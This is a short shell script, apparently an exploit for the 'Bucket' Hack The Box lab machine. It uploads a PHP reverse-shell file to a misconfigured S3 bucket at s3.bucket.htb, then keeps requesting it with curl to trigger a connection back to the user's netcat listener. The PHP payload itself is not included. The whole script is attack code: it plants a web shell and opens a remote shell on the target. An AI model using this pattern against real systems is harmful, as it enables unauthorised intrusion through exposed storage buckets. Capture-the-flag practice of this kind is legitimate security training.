
#!/bin/sh

aws --endpoint-url http://s3.bucket.htb/ s3 cp myrev.php s3://adserver/myrev.php

echo ""
echo "[-] Executing reverse shell...Please run nc listener"
echo "[-] Kill me with Ctrl+C on successful connection"

while [ true ]
do
	curl http://bucket.htb/myrev.php &> /dev/null
done

